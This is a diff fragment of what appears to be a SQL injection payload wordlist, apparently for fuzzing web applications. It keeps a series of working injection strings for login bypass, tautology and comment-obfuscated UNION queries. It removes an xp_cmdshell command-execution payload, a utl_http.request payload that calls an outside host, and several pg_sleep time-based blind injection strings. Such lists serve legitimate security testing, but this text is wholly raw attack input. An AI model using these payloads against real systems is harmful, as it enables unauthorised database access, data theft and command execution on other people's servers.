@@ -13,9 +13,7 @@ x' and 1=(select count(*) from tabname); --
 x' and members.email is NULL; --
 x' or full_name like '%bob%
 23 or 1=1; --
-'; exec master..xp_cmdshell 'ping 172.10.1.255'--
 ' or '1'='1
-'||utl_http.request('httP://192.168.1.1/')||'
 ' or 1=1--
 " or 1=1--
 ' or 'a'='a
@@ -31,8 +29,3 @@ admin' or '
 ' or 1/*
 or 1=1--
 uni/**/on sel/**/ect
-1 AND 1=(SELECT 1 FROM pg_sleep(5))-- 
-' AND 1=(SELECT 1 FROM pg_sleep(5))-- 
-1 AND 31337=(SELECT 31337 FROM pg_sleep(5))-- 
-'||(SELECT 1 FROM pg_sleep(5))--
-
